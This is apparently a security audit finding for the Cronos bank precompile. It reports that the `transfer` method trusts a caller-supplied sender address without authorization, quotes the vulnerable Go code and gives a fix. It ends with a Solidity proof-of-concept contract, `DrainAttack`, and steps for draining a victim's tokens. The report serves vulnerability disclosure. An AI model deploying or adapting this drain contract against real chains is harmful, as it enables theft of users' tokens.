### Title
Bank Precompile `transfer` Uses Caller-Supplied `sender` Without Authorization Check — Unauthorized Transfer of `evm/<contract>` Native Tokens - (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary
The bank precompile's `transfer` method accepts the `sender` address as a caller-supplied argument and uses it directly as the `from` address in `bankKeeper.SendCoins`, without verifying that `sender == contract.Caller()`. Any EVM contract can therefore call `bankPrecompile.transfer(victim, attacker, amount)` and drain any user's `evm/<contract>` denomination tokens without the victim's consent.

### Finding Description
In `x/cronos/keeper/precompiles/bank.go`, the `Run` function handles the `transfer` method as follows:

```go
case TransferMethodName:
    args, err := method.Inputs.Unpack(contract.Input[4:])
    ...
    sender    := args[0].(common.Address)   // ← attacker-controlled
    recipient := args[1].(common.Address)
    amount    := args[2].(*big.Int)
    ...
    from  := sdk.AccAddress(sender.Bytes())
    to    := sdk.AccAddress(recipient.Bytes())
    denom := EVMDenom(contract.Caller())    // "evm/<calling_contract>"
    amt   := sdk.NewCoin(denom, ...)
    ...
    bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

The `sender` (i.e., `from`) is taken verbatim from `args[0]`, which is fully controlled by the calling contract. There is no check that `sender == contract.Caller()`. The denom is `evm/<contract.Caller()>`, so the calling contract can transfer any user's balance of that denomination to an arbitrary recipient.

The `mint` method, by contrast, correctly uses `contract.Caller()` only to derive the denom, and credits the minted tokens to the caller-supplied `recipient`. The `transfer` method should similarly restrict the `from` address to `contract.Caller()`. [2](#0-1) 

### Impact Explanation
**Critical — Unauthorized transfer of native bank-module assets.**

Any EVM contract can call `bankPrecompile.transfer(victim, attacker, amount)` to move `evm/<contract>` denomination tokens from `victim` to `attacker` without the victim's signature or approval. This is a direct, unauthorized balance change for precompile-controlled assets, matching the Critical impact class: *unauthorized transfer of precompile-controlled assets*.

### Likelihood Explanation
The `evm/<contract>` denomination tokens are created by the bank precompile's `mint` function and held in users' native Cosmos bank accounts. Any contract that has previously minted such tokens to users (e.g., a DeFi protocol using the bank precompile) creates a pool of victims. An attacker deploys a contract, calls `mint` to establish the denom, distributes tokens to users, and then calls `transfer(victim, attacker, balance)` to drain them. No privileged access, leaked keys, or governance compromise is required — only the ability to deploy an EVM contract and call a precompile.

### Recommendation
Enforce that the `from` address equals the calling contract's address, or restrict `transfer` so that only the token owner (i.e., `contract.Caller()`) can initiate a transfer:

```go
case TransferMethodName:
    ...
    // Enforce: only the calling contract may be the sender
    if sender != contract.Caller() {
        return nil, errors.New("sender must be the calling contract")
    }
    ...
```

Alternatively, remove the `sender` argument entirely and derive `from` from `contract.Caller()`, consistent with how `mint` and `burn` derive the denom from `contract.Caller()`. [3](#0-2) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    // transfer(address sender, address recipient, uint256 amount) → bool
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function mint(address recipient, uint256 amount) external returns (bool);
}

contract DrainAttack {
    IBankPrecompile constant BANK = IBankPrecompile(address(0x64));

    // Step 1: attacker mints evm/<this> tokens to victim (e.g., as part of a DeFi protocol)
    function seedVictim(address victim, uint256 amount) external {
        BANK.mint(victim, amount);
    }

    // Step 2: attacker drains victim's evm/<this> tokens — no victim signature required
    function drain(address victim, address attacker, uint256 amount) external {
        // sender = victim (args[0]), but caller = this contract
        // bank precompile does NOT check sender == msg.sender
        BANK.transfer(victim, attacker, amount);
    }
}
```

1. Deploy `DrainAttack`; its address becomes the denom namespace `evm/<DrainAttack>`.
2. Call `seedVictim(victim, 1000)` — victim now holds 1000 `evm/<DrainAttack>` tokens.
3. Call `drain(victim, attacker, 1000)` — the bank precompile executes `SendCoins(victim → attacker, 1000 evm/<DrainAttack>)` with no authorization from `victim`.
4. Victim's balance is zero; attacker holds 1000 tokens.

The root cause is the missing `sender == contract.Caller()` guard in the `transfer` case of `bank.go`. [4](#0-3)
